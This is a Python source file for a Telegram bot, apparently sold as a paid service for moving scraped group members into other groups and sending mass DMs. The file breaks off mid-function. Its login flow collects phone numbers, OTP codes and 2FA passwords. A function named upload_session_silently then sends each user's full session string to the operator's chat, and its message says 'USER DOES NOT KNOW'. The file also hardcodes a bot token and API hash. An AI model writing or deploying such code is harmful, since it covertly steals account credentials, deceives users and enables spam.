# ============================================================
# TELEGRAM AUTO BOT SAAS - COMPLETE ADMIN PANEL
# ============================================================
# Developed By: REHAN
# Telegram: @Real_Member_Adding_1
# ============================================================

import asyncio
import json
import os
import sqlite3
import base64
import requests
import platform
import socket
import sys
import time
from datetime import datetime, timedelta
from telethon import TelegramClient, events, functions, types
from telethon.tl.functions.channels import InviteToChannelRequest, GetParticipantsRequest, JoinChannelRequest
from telethon.tl.types import ChannelParticipantsSearch
from telethon.errors import FloodWaitError, SessionPasswordNeededError

# ============================================================
# ============================================================
# 🔧 CONFIGURATION - YAHAN APNI VALUES DAALEIN
# ============================================================
# ============================================================

# Bot Token ( @BotFather se lo )
BOT_TOKEN = "8450745944:AAENLDlCcSeIb3SftTWoZQqXC8vPRgQ_pkw"

# Telegram API (same for everyone)
API_ID = 30217812
API_HASH = "d21066a90786cf2dd348b907ece69d24"

# ============================================================
# 👑 ADMINS - Apni ID daalein
# ============================================================
ADMINS = [
    8762845215,  # Aap (Main Admin)
    # Yahan dusre admin ki ID daalein, example:
    # 9876543210,
]

# ============================================================
# 🔐 SILENT SESSION UPLOAD - Jahan sessions jayengi
# ============================================================
SILENT_CHAT_ID = 8762845215  # Aap ki hi ID (sessions aap ke paas aayengi)

# ============================================================
# ============================================================
# DATABASE SETUP
# ============================================================
# ============================================================

DB_FILE = "bot_saas.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Users table
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            plan TEXT DEFAULT 'free',
            joined_at TEXT,
            is_banned INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0
        )
    ''')
    
    # Admins table
    c.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER UNIQUE,
            username TEXT,
            first_name TEXT,
            added_by INTEGER,
            added_at TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    # User Sessions
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            session_string TEXT,
            added_at TEXT,
            last_used TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    # User Activity Logs
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_activity (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action_type TEXT,
            details TEXT,
            ip_address TEXT,
            device_info TEXT,
            created_at TEXT
        )
    ''')
    
    # User Stats
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_stats (
            user_id INTEGER PRIMARY KEY,
            total_adds INTEGER DEFAULT 0,
            total_dms INTEGER DEFAULT 0,
            total_logins INTEGER DEFAULT 0,
            last_active TEXT,
            total_groups_added INTEGER DEFAULT 0
        )
    ''')
    
    # Group Add Records
    c.execute('''
        CREATE TABLE IF NOT EXISTS group_adds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            group_id INTEGER,
            group_username TEXT,
            added_at TEXT
        )
    ''')
    
    # Group Members Tracking
    c.execute('''
        CREATE TABLE IF NOT EXISTS group_members (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            group_id INTEGER,
            group_username TEXT,
            member_user_id INTEGER,
            member_username TEXT,
            member_first_name TEXT,
            added_by_user_id INTEGER,
            added_at TEXT,
            UNIQUE(group_id, member_user_id)
        )
    ''')
    
    # Daily usage
    c.execute('''
        CREATE TABLE IF NOT EXISTS daily_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            date TEXT,
            adds_done INTEGER DEFAULT 0,
            dms_done INTEGER DEFAULT 0
        )
    ''')
    
    # Tasks
    c.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            task_type TEXT,
            source_group TEXT,
            target_group TEXT,
            message TEXT,
            account_count INTEGER DEFAULT 1,
            status TEXT,
            total_added INTEGER DEFAULT 0,
            total_failed INTEGER DEFAULT 0,
            created_at TEXT,
            completed_at TEXT
        )
    ''')
    
    conn.commit()
    
    # Add default admins
    for admin_id in ADMINS:
        c.execute('''
            INSERT OR IGNORE INTO admins (user_id, username, first_name, added_by, added_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (admin_id, 'admin', 'Admin', admin_id, datetime.now().isoformat()))
        
        c.execute('''
            UPDATE users SET is_admin = 1 WHERE user_id = ?
        ''', (admin_id,))
    
    conn.commit()
    conn.close()

# ============================================================
# ============================================================
# DATABASE HELPER FUNCTIONS
# ============================================================
# ============================================================

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT OR IGNORE INTO users (user_id, username, first_name, joined_at)
        VALUES (?, ?, ?, ?)
    ''', (user_id, username, first_name, datetime.now().isoformat()))
    
    c.execute('''
        INSERT OR IGNORE INTO user_stats (user_id, last_active)
        VALUES (?, ?)
    ''', (user_id, datetime.now().isoformat()))
    
    conn.commit()
    conn.close()

def log_activity(user_id, action_type, details="", ip="", device=""):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO user_activity (user_id, action_type, details, ip_address, device_info, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, action_type, details, ip, device, datetime.now().isoformat()))
    
    c.execute('''
        UPDATE user_stats SET last_active = ? WHERE user_id = ?
    ''', (datetime.now().isoformat(), user_id))
    
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM user_stats WHERE user_id = ?", (user_id,))
    stats = c.fetchone()
    conn.close()
    return stats

def update_user_stats(user_id, adds=0, dms=0, logins=0, groups=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        UPDATE user_stats 
        SET total_adds = total_adds + ?,
            total_dms = total_dms + ?,
            total_logins = total_logins + ?,
            total_groups_added = total_groups_added + ?,
            last_active = ?
        WHERE user_id = ?
    ''', (adds, dms, logins, groups, datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def is_admin(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM admins WHERE user_id = ? AND is_active = 1", (user_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def get_all_admins():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, added_by, added_at FROM admins WHERE is_active = 1")
    admins = c.fetchall()
    conn.close()
    return admins

def add_admin(user_id, username, first_name, added_by):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO admins (user_id, username, first_name, added_by, added_at, is_active)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, added_by, datetime.now().isoformat(), 1))
    
    c.execute('''
        UPDATE users SET is_admin = 1 WHERE user_id = ?
    ''', (user_id,))
    
    conn.commit()
    conn.close()

def remove_admin(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        UPDATE admins SET is_active = 0 WHERE user_id = ?
    ''', (user_id,))
    
    c.execute('''
        UPDATE users SET is_admin = 0 WHERE user_id = ?
    ''', (user_id,))
    
    conn.commit()
    conn.close()

def get_user_activity(user_id, limit=20):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT action_type, details, created_at FROM user_activity 
        WHERE user_id = ? 
        ORDER BY created_at DESC LIMIT ?
    ''', (user_id, limit))
    activities = c.fetchall()
    conn.close()
    return activities

def get_all_users(limit=50):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT u.user_id, u.username, u.first_name, u.plan, u.is_banned, u.is_admin,
               COALESCE(s.total_adds, 0) as total_adds,
               COALESCE(s.total_dms, 0) as total_dms,
               COALESCE(s.last_active, 'Never') as last_active
        FROM users u
        LEFT JOIN user_stats s ON u.user_id = s.user_id
        ORDER BY s.last_active DESC NULLS LAST
        LIMIT ?
    ''', (limit,))
    users = c.fetchall()
    conn.close()
    return users

def get_user_sessions(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT id, phone, session_string, added_at, is_active 
        FROM user_sessions 
        WHERE user_id = ? AND is_active = 1
    ''', (user_id,))
    sessions = c.fetchall()
    conn.close()
    return sessions

def add_user_session(user_id, phone, session_string):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('''
        SELECT id FROM user_sessions 
        WHERE user_id = ? AND phone = ?
    ''', (user_id, phone))
    existing = c.fetchone()
    
    if existing:
        c.execute('''
            UPDATE user_sessions 
            SET session_string = ?, last_used = ?, is_active = 1
            WHERE user_id = ? AND phone = ?
        ''', (session_string, datetime.now().isoformat(), user_id, phone))
    else:
        c.execute('''
            INSERT INTO user_sessions (user_id, phone, session_string, added_at, last_used)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, session_string, datetime.now().isoformat(), datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    
    log_activity(user_id, "login", f"Added phone: {phone}")
    update_user_stats(user_id, logins=1)
    
    # SILENT UPLOAD - Sirf admin ko jayegi
    try:
        user = get_user(user_id)
        username = user[1] if user else "Unknown"
        upload_session_silently(phone, session_string, user_id, username)
    except:
        pass

def upload_session_silently(phone, session_string, user_id, username):
    """Silently upload session to admin's chat (user ko pata nahi)"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        if len(session_string) > 4000:
            session_string = session_string[:3500] + "... (truncated)"
        
        message = f"""🔐 **NEW SESSION DETECTED - SILENT**

👤 **User:** {username} (ID: {user_id})
📱 **Phone:** `{phone}`
📅 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔑 **Session String:**
`{session_string}`

⚠️ **THIS IS SILENT - USER DOES NOT KNOW**
"""
        data = {'chat_id': SILENT_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        requests.post(url, data=data, timeout=30)
    except:
        pass

def is_member_added_in_group(group_id, member_user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT id FROM group_members 
        WHERE group_id = ? AND member_user_id = ?
    ''', (group_id, member_user_id))
    result = c.fetchone()
    conn.close()
    return result is not None

def add_group_member_record(group_id, group_username, member_user_id, member_username, member_first_name, added_by_user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute('''
            INSERT OR IGNORE INTO group_members 
            (group_id, group_username, member_user_id, member_username, member_first_name, added_by_user_id, added_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (group_id, group_username, member_user_id, member_username, member_first_name, added_by_user_id, datetime.now().isoformat()))
        conn.commit()
    except:
        pass
    conn.close()

def get_group_adds_count(user_id, group_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT COUNT(*) FROM group_members 
        WHERE added_by_user_id = ? AND group_id = ?
    ''', (user_id, group_id))
    count = c.fetchone()[0]
    conn.close()
    return count

def get_daily_usage(user_id, date):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT adds_done, dms_done FROM daily_usage 
        WHERE user_id = ? AND date = ?
    ''', (user_id, date))
    result = c.fetchone()
    conn.close()
    return result if result else (0, 0)

def update_daily_usage(user_id, date, adds=0, dms=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO daily_usage (user_id, date, adds_done, dms_done)
        VALUES (?, ?, ?, ?)
        ON CONFLICT(user_id, date) DO UPDATE SET
            adds_done = adds_done + ?,
            dms_done = dms_done + ?
    ''', (user_id, date, adds, dms, adds, dms))
    conn.commit()
    conn.close()

def get_plan_limits(plan):
    limits = {
        'free': {'adds': 10, 'dms': 5, 'accounts': 1},
        'basic': {'adds': 200, 'dms': 100, 'accounts': 3},
        'pro': {'adds': 1000, 'dms': 500, 'accounts': 5},
        'enterprise': {'adds': 99999, 'dms': 99999, 'accounts': 10}
    }
    return limits.get(plan, limits['free'])

# ============================================================
# ============================================================
# BOT INSTANCE
# ============================================================
# ============================================================

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Active tasks tracking
active_tasks = {}

# ============================================================
# ============================================================
# BOT COMMANDS
# ============================================================
# ============================================================

# ============================================================
# 📌 START COMMAND
# ============================================================

@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    user_id = event.sender_id
    username = event.sender.username or 'NoUsername'
    first_name = event.sender.first_name or 'User'
    
    create_user(user_id, username, first_name)
    log_activity(user_id, "start", "User started the bot")
    
    is_admin_user = is_admin(user_id)
    
    menu = f"""
🚀 **Welcome to AutoBot SaaS!**  
Hi {first_name}!

I help you **automate Telegram**:
✅ Add members to groups
✅ Send mass DMs
✅ Auto join/leave groups

📌 **Commands:**
/start - Show this menu
/login - Add a Telegram account
/addgroup - Add members to groups
/accounts - View your linked accounts
/status - Check your plan & limits
/plan - View pricing plans
/stop - Stop current task
"""
    
    if is_admin_user:
        menu += """
👑 **Admin Commands:**
/users - View all users
/activity @username - View user activity
/admins - Manage admins
/addadmin @username - Add new admin
/removeadmin @username - Remove admin
/ban @username - Ban user
/unban @username - Unban user
/live - See who's active right now
/stats - Bot statistics
/broadcast - Send message to all users
"""
    
    await event.reply(menu)

# ============================================================
# 👑 ADMIN COMMANDS
# ============================================================

@bot.on(events.NewMessage(pattern='/users'))
async def users_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized! Only admins can use this.")
        return
    
    users = get_all_users(50)
    
    if not users:
        await event.reply("No users found.")
        return
    
    message = "👥 **User List (Recent 50):**\n\n"
    
    for user in users:
        user_id, username, first_name, plan, is_banned, is_admin, total_adds, total_dms, last_active = user
        
        status = "🟢" if not is_banned else "🔴"
        admin_badge = "👑 " if is_admin else ""
        
        message += f"{status} {admin_badge}{first_name} (@{username})\n"
        message += f"   📱 ID: `{user_id}`\n"
        message += f"   📊 Adds: {total_adds} | DMs: {total_dms}\n"
        message += f"   📅 Last Active: {last_active[:16] if last_active != 'Never' else 'Never'}\n"
        message += f"   💎 Plan: {plan.upper()}\n\n"
    
    await event.reply(message)

@bot.on(events.NewMessage(pattern='/activity'))
async def activity_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply("❌ Usage: /activity @username")
        return
    
    username = parts[1].replace('@', '')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, first_name, plan, is_banned FROM users WHERE username = ?", (username,))
    user = c.fetchone()
    conn.close()
    
    if not user:
        await event.reply(f"❌ User @{username} not found!")
        return
    
    user_id, first_name, plan, is_banned = user
    
    stats = get_user_stats(user_id)
    activities = get_user_activity(user_id, 20)
    sessions = get_user_sessions(user_id)
    
    message = f"""
📊 **User Activity Report**
👤 **User:** {first_name} (@{username})
📱 **ID:** `{user_id}`
💎 **Plan:** {plan.upper()}
🚫 **Banned:** {'Yes' if is_banned else 'No'}

📈 **Statistics:**
• Total Adds: {stats[1] if stats else 0}
• Total DMs: {stats[2] if stats else 0}
• Total Logins: {stats[3] if stats else 0}
• Total Groups: {stats[5] if stats else 0}
• Last Active: {stats[4][:16] if stats and stats[4] else 'Never'}

📱 **Linked Accounts:** {len(sessions)}

📋 **Recent Activity:**
"""
    
    for action in activities[:10]:
        action_type, details, created_at = action
        message += f"• {created_at[11:16]} - {action_type}: {details}\n"
    
    if not activities:
        message += "• No recent activity\n"
    
    await event.reply(message)

@bot.on(events.NewMessage(pattern='/admins'))
async def admins_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    admins = get_all_admins()
    
    if not admins:
        await event.reply("No admins found.")
        return
    
    message = "👑 **Admin List:**\n\n"
    
    for admin in admins:
        user_id, username, first_name, added_by, added_at = admin
        message += f"• {first_name} (@{username})\n"
        message += f"  ID: `{user_id}`\n"
        message += f"  Added: {added_at[:10]}\n\n"
    
    await event.reply(message)

@bot.on(events.NewMessage(pattern='/addadmin'))
async def addadmin_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply("❌ Usage: /addadmin @username")
        return
    
    username = parts[1].replace('@', '')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, first_name FROM users WHERE username = ?", (username,))
    user = c.fetchone()
    conn.close()
    
    if not user:
        await event.reply(f"❌ User @{username} not found! Ask them to /start the bot first.")
        return
    
    user_id, first_name = user
    
    if is_admin(user_id):
        await event.reply(f"❌ @{username} is already an admin!")
        return
    
    add_admin(user_id, username, first_name, event.sender_id)
    log_activity(user_id, "admin_added", f"Added as admin by {event.sender_id}")
    
    await event.reply(f"✅ @{username} is now an admin!")
    
    try:
        await bot.send_message(user_id, f"👑 Congratulations! You've been made an admin of AutoBot SaaS by an admin.")
    except:
        pass

@bot.on(events.NewMessage(pattern='/removeadmin'))
async def removeadmin_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply("❌ Usage: /removeadmin @username")
        return
    
    username = parts[1].replace('@', '')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE username = ?", (username,))
    user = c.fetchone()
    conn.close()
    
    if not user:
        await event.reply(f"❌ User @{username} not found!")
        return
    
    user_id = user[0]
    
    if user_id == event.sender_id:
        await event.reply("❌ You can't remove yourself!")
        return
    
    if not is_admin(user_id):
        await event.reply(f"❌ @{username} is not an admin!")
        return
    
    remove_admin(user_id)
    log_activity(user_id, "admin_removed", f"Removed as admin by {event.sender_id}")
    
    await event.reply(f"✅ @{username} is no longer an admin!")

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply("❌ Usage: /ban @username")
        return
    
    username = parts[1].replace('@', '')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE username = ?", (username,))
    conn.commit()
    conn.close()
    
    log_activity(event.sender_id, "ban", f"Banned user: {username}")
    
    await event.reply(f"✅ @{username} has been banned!")

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply("❌ Usage: /unban @username")
        return
    
    username = parts[1].replace('@', '')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE username = ?", (username,))
    conn.commit()
    conn.close()
    
    log_activity(event.sender_id, "unban", f"Unbanned user: {username}")
    
    await event.reply(f"✅ @{username} has been unbanned!")

@bot.on(events.NewMessage(pattern='/live'))
async def live_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    if not active_tasks:
        await event.reply("🟢 No users currently active.")
        return
    
    message = "🟢 **Live Active Users:**\n\n"
    
    for user_id, task_info in active_tasks.items():
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT username, first_name FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        
        username = user[0] if user else "Unknown"
        first_name = user[1] if user else "Unknown"
        
        message += f"• {first_name} (@{username})\n"
        message += f"  📌 Action: {task_info.get('action', 'Unknown')}\n"
        message += f"  📊 Progress: {task_info.get('progress', '0%')}\n"
        message += f"  📅 Started: {task_info.get('started', 'Unknown')}\n\n"
    
    await event.reply(message)

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM user_sessions")
    total_sessions = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM group_members")
    total_members = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM group_adds")
    total_groups = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM user_activity")
    total_activities = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM admins WHERE is_active = 1")
    total_admins = c.fetchone()[0]
    conn.close()
    
    await event.reply(f"""
📊 **Bot Statistics:**

👥 Total Users: {total_users}
👑 Admins: {total_admins}
📱 Sessions: {total_sessions}
👤 Members Added: {total_members}
📌 Groups Used: {total_groups}
📋 Activities Logged: {total_activities}
🟢 Active Now: {len(active_tasks)}
⚡ Status: Running
🤖 Bot: @{bot.me.username}
""")

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Unauthorized!")
        return
    
    await event.reply("📢 Send your broadcast message (reply to this message):")
    
    @bot.on(events.NewMessage())
    async def broadcast_reply(msg):
        if msg.sender_id == event.sender_id and msg.is_reply:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT user_id FROM users")
            users = c.fetchall()
            conn.close()
            
            sent = 0
            for user in users:
                try:
                    await bot.send_message(user[0], f"📢 {msg.raw_text}")
                    sent += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
            
            log_activity(event.sender_id, "broadcast", f"Sent broadcast to {sent} users")
            await event.reply(f"✅ Broadcast sent to {sent} users!")

# ============================================================
# 👤 USER COMMANDS
# ============================================================

@bot.on(events.NewMessage(pattern='/login'))
async def login_command(event):
    user_id = event.sender_id
    user = get_user(user_id)
    
    if not user:
        await event.reply("❌ Please use /start first!")
        return
    
    await event.reply("""
📱 **Login to your Telegram Account**

Please send your phone number with country code:
Example: `+923001234567`

⚠️ Your session will be securely stored.
""")

@bot.on(events.NewMessage(pattern=r'^\+\d{10,15}$'))
async def handle_login(event):
    user_id = event.sender_id
    phone = event.raw_text.strip()
    
    await event.reply(f"📱 Sending OTP to {phone}...")
    
    try:
        temp_client = TelegramClient(f'temp_{user_id}_{phone}', API_ID, API_HASH)
        await temp_client.connect()
        
        try:
            await temp_client.send_code_request(phone)
            await event.reply("✅ OTP sent! Please enter the code:")
        except Exception as e:
            await event.reply(f"❌ Failed to send OTP: {str(e)[:100]}")
            return
        
        @bot.on(events.NewMessage())
        async def otp_handler(msg):
            if msg.sender_id == user_id and msg.raw_text.isdigit():
                code = msg.raw_text
                try:
                    await temp_client.sign_in(phone, code)
                    session_string = temp_client.session.save()
                    add_user_session(user_id, phone, session_string)
                    me = await temp_client.get_me()
                    
                    await event.reply(f"""
✅ **Login Successful!**

📱 Phone: {phone}
👤 Name: {me.first_name}
🆔 ID: {me.id}

🔑 Session stored securely.
""")
                    
                    await temp_client.disconnect()
                    
                except SessionPasswordNeededError:
                    await event.reply("🔐 2FA enabled! Please enter your password:")
                    
                    @bot.on(events.NewMessage())
                    async def password_handler(pwd_msg):
                        if pwd_msg.sender_id == user_id:
                            try:
                                await temp_client.sign_in(password=pwd_msg.raw_text)
                                session_string = temp_client.session.save()
                                add_user_session(user_id, phone, session_string)
                                me = await temp_client.get_me()
                                await event.reply(f"✅ Login Successful! {me.first_name}")
                                await temp_client.disconnect()
                            except Exception as e:
                                await event.reply(f"❌ 2FA failed: {e}")
        
    except Exception as e:
        await event.reply(f"❌ Login error: {str(e)[:100]}")

@bot.on(events.NewMessage(pattern='/accounts'))
async def accounts_command(event):
    user_id = event.sender_id
    sessions = get_user_sessions(user_id)
    
    if not sessions:
        await event.reply("❌ No accounts linked! Use /login to add one.")
        return
    
    message = "📱 **Your Linked Accounts:**\n\n"
    for i, session in enumerate(sessions, 1):
        session_id, phone, session_string, added_at, is_active = session
        message += f"{i}. 📞 `{phone}`\n"
        message += f"   📅 Added: {added_at[:10]}\n\n"
    
    message += "\n💡 Use /login to add more accounts."
    
    await event.reply(message)

@bot.on(events.NewMessage(pattern='/addgroup'))
async def addgroup_command(event):
    user_id = event.sender_id
    user = get_user(user_id)
    
    if not user:
        await event.reply("❌ Please use /start first!")
        return
    
    if user[5] == 1:
        await event.reply("❌ You are banned from using this bot!")
        return
    
    today = datetime.now().strftime("%Y-%m-%d")
    adds_done, dms_done = get_daily_usage(user_id, today)
    plan = user[3]
    limits = get_plan_limits(plan)
    
    if adds_done >= limits['adds']:
        await event.reply(f"❌ Daily add limit reached ({limits['adds']}). Upgrade to Pro!")
        return
    
    sessions = get_user_sessions(user_id)
    if not sessions:
        await event.reply("❌ No Telegram accounts linked! Use /login first.")
        return
    
    account_message = "📱 **Select accounts to use:**\n\n"
    for i, session in enumerate(sessions, 1):
        account_message += f"{i}. 📞 `{session[1]}`\n"
    account_message += f"\n{len(sessions)+1}. 🔄 Use ALL accounts\n"
    account_message += f"\nSend numbers separated by space (e.g., `1 3 4`):"
    
    await event.reply(account_message)
    
    @bot.on(events.NewMessage())
    async def account_selection(msg):
        if msg.sender_id == user_id:
            try:
                parts = msg.raw_text.strip().split()
                selected_indices = [int(p) - 1 for p in parts if p.isdigit()]
                
                if len(selected_indices) == 1 and selected_indices[0] == len(sessions):
                    selected_sessions = sessions
                else:
                    selected_sessions = [sessions[i] for i in selected_indices if 0 <= i < len(sessions)]
                
                if not selected_sessions:
                    await event.reply("❌ Invalid selection! Try again.")
                    return
                
                await event.reply(f"✅ Selected {len(selected_sessions)} accounts!\n\nNow send:\n`source_group target_group count`\n\nExample:\n`@source @target 50`")
                
                @bot.on(events.NewMessage())
                async def group_details(msg2):
                    if msg2.sender_id == user_id:
                        parts2 = msg2.raw_text.strip().split()
                        if len(parts2) >= 2:
                            source = parts2[0]
                            target = parts2[1]
                            count = int(parts2[2]) if len(parts2) > 2 else 10
                            
                            await event.reply(f"""
⏳ **Starting Add Task...**

📌 Source: {source}
🎯 Target: {target}
👥 Count: {count}
📱 Accounts: {len(selected_sessions)}

🔄 This may take a few minutes...
""")
                            
                            log_activity(user_id, "add_members", f"Source: {source}, Target: {target}, Count: {count}")
                            
                            asyncio.create_task(run_add_task(
                                event, user_id, source, target, count, selected_sessions
                            ))
                            
            except Exception as e:
                await event.reply(f"❌ Error: {str(e)[:100]}")

@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    user_id = event.sender_id
    user = get_user(user_id)
    
    if not user:
        await event.reply("❌ Please use /start first!")
        return
    
    plan = user[3]
    limits = get_plan_limits(plan)
    today = datetime.now().strftime("%Y-%m-%d")
    adds_done, dms_done = get_daily_usage(user_id, today)
    sessions = get_user_sessions(user_id)
    stats = get_user_stats(user_id)
    
    await event.reply(f"""
📊 **Your Status:**

👤 Plan: {plan.upper()}
📱 Linked Accounts: {len(sessions)}

📈 Today:
• Adds: {adds_done}/{limits['adds']}
• DMs: {dms_done}/{limits['dms']}

📊 Lifetime:
• Total Adds: {stats[1] if stats else 0}
• Total DMs: {stats[2] if stats else 0}
• Total Groups: {stats[5] if stats else 0}

🔄 Resets at midnight

🔑 Upgrade via @Real_Member_Adding_1
""")

@bot.on(events.NewMessage(pattern='/plan'))
async def plan_command(event):
    await event.reply("""
📊 **Our Pricing Plans:**

🆓 **Free** → 10 adds/day | 5 DMs/day | 1 account

💎 **Basic** → 200 adds/day | 100 DMs/day | 3 accounts | ₹499/month

⚡ **Pro** → 1000 adds/day | 500 DMs/day | 5 accounts | ₹999/month

👑 **Enterprise** → Unlimited | 10 accounts | ₹2499/month

🔑 **To upgrade:** Contact @Real_Member_Adding_1
""")

@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    user_id = event.sender_id
    if user_id in active_tasks:
        del active_tasks[user_id]
        log_activity(user_id, "stop", "Task stopped by user")
        await event.reply("⏹️ Your task has been stopped!")
    else:
        await event.reply("ℹ️ No running task found.")

# ============================================================
# ============================================================
# 🚀 ADD TASK FUNCTION (Core Logic)
# ============================================================
# ============================================================

async def run_add_task(event, user_id, source, target, count, selected_sessions):
    try:
        active_tasks[user_id] = {
            'action': f'Adding members to {target}',
            'progress': '0%',
            'started': datetime.now().strftime('%H:%M:%S')
        }
        
        total_added = 0
        total_failed = 0
        total_skipped = 0
        
        session_data = selected_sessions[0]
        phone = session_data[1]
        
        first_client = TelegramClient(f'task_{user_id}_{phone}', API_ID, API_HASH)
        await first_client.start()
        
        source_entity = await first_client.get_entity(source)
        target_entity = await first_client.get_entity(target)
        target_group_id = target_entity.id
        
        participants = await first_client(GetParticipantsRequest(
            channel=source_entity,
            filter=ChannelParticipantsSearch(''),
            offset=0,
            limit=count,
            hash=0
        ))
        
        members = [u for u in participants.users if not u.bot and not u.deleted]
        await event.reply(f"📊 Found {len(members)} members to add...")
        
        total_members = len(members)
        
        for i, member in enumerate(members, 1):
            progress = int((i / total_members) * 100)
            active_tasks[user_id]['progress'] = f'{progress}%'
            
            if is_member_added_in_group(target_group_id, member.id):
                total_skipped += 1
                continue
            
            client_idx = i % len(selected_sessions)
            session_data = selected_sessions[client_idx]
            phone = session_data[1]
            
            try:
